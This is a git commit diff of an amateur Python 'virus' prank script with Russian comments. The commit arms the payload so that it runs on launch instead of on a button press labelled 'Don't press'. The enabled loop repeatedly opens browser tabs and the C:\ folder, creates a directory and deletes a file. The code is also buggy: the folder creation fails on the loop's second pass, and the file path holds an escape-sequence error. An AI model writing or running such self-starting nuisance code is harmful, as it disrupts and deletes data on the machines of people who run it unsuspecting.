223baf74217f46a445c76c99d5d8e366349aaaf3
Roman <11-roman@mail.ru>
2023-08-16 22:07:44 +0300

    запуск функции без нажатия кнопки

--- virus/virus_2.py
+++ virus/virus_2.py
@@ -5,16 +5,17 @@ from random import randint
 import webbrowser as wb
 import os
 
+
 def open_git():
     print("Ты - Душнила. Я знаю, спасибо.")
     # os.remove('1.py') # удаляет файл в папке
     while True:
-        # wb.open('https://github.com/')
+        wb.open('https://github.com/')
         path = r'C:\\' # добавил открытие папки в цикле
         os.startfile(path)
         print("Текущая директория:", os.getcwd()) # вывести текущую директорию в консоль
         os.mkdir("folder") # создает новую папку в текущей директории
-        #os.remove('virus\1.py')
+        os.remove('virus\1.py')
 
 
 root = Tk ()
@@ -22,6 +23,7 @@ root.title ('')
 root.geometry ('350x350+200+200')
 root.config (bg = '')
 
-Button (root, text="Не нажимать", command=open_git).pack()
+#Button (root, text="Не нажимать", command=open_git).pack()
+open_git() # запуск функции без нажатия кнопки
 
 root.mainloop ()
